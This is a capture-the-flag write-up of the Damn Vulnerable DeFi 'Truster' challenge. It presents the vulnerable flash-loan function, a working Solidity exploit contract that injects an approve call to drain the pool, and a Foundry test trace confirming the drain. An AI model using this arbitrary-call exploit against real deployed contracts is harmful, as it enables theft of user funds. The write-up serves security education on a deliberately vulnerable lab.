# Truster Challenge

### Challenge:
More and more lending pools are offering flashloans. In this case, a new pool has launched that is offering flashloans of DVT tokens for free.

The pool holds 1 million DVT tokens. You have nothing.

To pass this challenge, **rescue all funds in the pool executing a single transaction**. Deposit the funds into the designated recovery account.

#### Smart Contract :
TrusterLender Pool: Offering flash loans of DVT tokens for free

### Vulnerability Explained:

In this Pool, the flash loan function is calling `target.functionCall(data)` in a low-level manner. The function call uses data that can be manipulated by an attacker to drain all the funds.

### Vulnerable Code:
```solidity
function flashLoan(
    uint256 amount,
    address borrower,
    address target,
    bytes calldata data
) external nonReentrant returns (bool) {
    uint256 balanceBefore = token.balanceOf(address(this));

    token.transfer(borrower, amount);
    target.functionCall(data); // Vulnerable is here, I smell it

    if (token.balanceOf(address(this)) < balanceBefore) {
        revert RepayFailed();
    }

    return true;
}
```
### Exploit strategy:
The attack strategy involves calling the approve function to grant the attacker permission to withdraw all tokens from the pool. The data is crafted using abi.encodeWithSignature("approve(address,uint256)", address(this), TOKENS_IN_POOL), which approves the attacker to transfer all the tokens from the pool. After approval, the attacker uses transferFrom to move the tokens to the recovery account.

### Exploit Code:
```solidity
function test_truster() public checkSolvedByPlayer {
    new TrusterExploiter(pool, token, recovery, TOKENS_IN_POOL);
}

// Exploiter Contract:
contract TrusterExploiter {
    constructor(
        TrusterLenderPool pool,
        DamnValuableToken token,
        address recovery,
        uint256 TOKENS_IN_POOL
    ) {
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            TOKENS_IN_POOL
        );
        pool.flashLoan(0, address(this), address(token), data);
        token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);
    }
}

``` 
### Proof of Exploit:
Check that the test case can easily understand the exploit:
```yaml
Ran 1 test for test/truster/Truster.t.sol:TrusterChallenge
[PASS] test_truster() (gas: 112277)
Traces:
  [139777] TrusterChallenge::test_truster()
    ├─ [0] VM::startPrank(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C])
    │   └─ ← [Return]
    ├─ [86541] → new TrusterExploiter@0xce110ab5927CC46905460D930CCa0c6fB4666219
    │   ├─ [46555] TrusterLenderPool::flashLoan(0, TrusterExploiter: [0xce110ab5927CC46905460D930CCa0c6fB4666219], DamnValuableToken: [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b], 0x095ea7b3000000000000000000000000ce110ab5927cc46905460d930cca0c6fb466621900000000000000000000000000000000000000000000d3c21bcecceda1000000)
    │   │   ├─ [2802] DamnValuableToken::balanceOf(TrusterLenderPool: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]) [staticcall]
    │   │   │   └─ ← [Return] 1000000000000000000000000 [1e24]
    │   │   ├─ [5651] DamnValuableToken::transfer(TrusterExploiter: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 0)
    │   │   │   ├─ emit Transfer(from: TrusterLenderPool: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], to: TrusterExploiter: [0xce110ab5927CC46905460D930CCa0c6fB4666219], amount: 0)
    │   │   │   └─ ← [Return] true
    │   │   ├─ [25079] DamnValuableToken::approve(TrusterExploiter: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 1000000000000000000000000 [1e24])
    │   │   │   ├─ emit Approval(owner: TrusterLenderPool: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], spender: TrusterExploiter: [0xce110ab5927CC46905460D930CCa0c6fB4666219], amount: 1000000000000000000000000 [1e24])
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   ├─ [802] DamnValuableToken::balanceOf(TrusterLenderPool: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]) [staticcall]
    │   │   │   └─ ← [Return] 1000000000000000000000000 [1e24]
    │   │   └─ ← [Return] true
    │   ├─ [29354] DamnValuableToken::transferFrom(TrusterLenderPool: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa], 1000000000000000000000000 [1e24])
    │   │   ├─ emit Transfer(from: TrusterLenderPool: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], to: recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa], amount: 1000000000000000000000000 [1e24])
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   └─ ← [Return] 21 bytes of code
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [0] VM::getNonce(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C]) [staticcall]
    │   └─ ← [Return] 1
    ├─ [0] VM::assertEq(1, 1, "Player executed more than one tx") [staticcall]
    │   └─ ← [Return]
    ├─ [802] DamnValuableToken::balanceOf(TrusterLenderPool: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::assertEq(0, 0, "Pool still has tokens") [staticcall]
    │   └─ ← [Return]
    ├─ [802] DamnValuableToken::balanceOf(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa]) [staticcall]
    │   └─ ← [Return] 1000000000000000000000000 [1e24]
    ├─ [0] VM::assertEq(1000000000000000000000000 [1e24], 1000000000000000000000000 [1e24], "Not enough tokens in recovery account") [staticcall]
    │   └─ ← [Return]
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 27.70ms (4.16ms CPU time)

```

🔗 **GitHub**: [View](https://github.com/BLOCK-PROGRAMR/SCATER70/tree/main/ctf/damn-vulnerable-defi)